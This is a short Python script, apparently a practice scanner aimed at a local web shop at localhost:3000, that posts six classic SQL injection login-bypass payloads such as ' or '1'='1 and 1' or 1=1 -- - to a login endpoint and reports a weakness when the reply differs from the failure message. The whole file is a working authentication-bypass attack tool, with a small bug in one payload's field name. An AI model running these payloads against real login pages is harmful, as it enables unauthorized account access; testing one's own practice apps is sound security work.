import requests


def input_values(email):
    """returns 6 different values of SQL injection of email and passwords"""
    attack_1 = {"email": email,
                "password": "' or '1'='1	"}
    attack_2 = {"email:": email,
                "password": "' or 1='1	"}
    attack_3 = {"email": email,
                "password": "1' or 1=1 -- -	"}
    attack_4 = {"email": "' or '1'='1	",
                "password": "' or '1'='1	"}
    attack_5 = {"email": "' or ' 1=1	",
                "password": "' or ' 1=1	"}
    attack_6 = {"email": "1' or 1=1 -- -	",
                "password": "12345678"}
    values_list = [attack_1, attack_2, attack_3, attack_4, attack_5, attack_6]
    return values_list


def check_login(url, values):
    """sends sql injection to the login page and returns True if the weakness are found, False otherwise"""
    for value in values:
        res = requests.post(url, data=value).content
        if res.decode() != 'Invalid email or password.':
            return f"[WORNING] a SQL Injection weakness was found\nDetails:\n[*] {value}"
    return f"No threats found."


if __name__ == "__main__":
    try:
        print("\t-- SQL INJECTION ATTACK --\n")
        email = "admin@gmail.com"
        url = "http://localhost:3000/rest/user/login"
        values = input_values(email)
        print(check_login(url, values))

    except:
        print("SYSTEM MESSAGE:\n\t[X] Automatic test failed...")
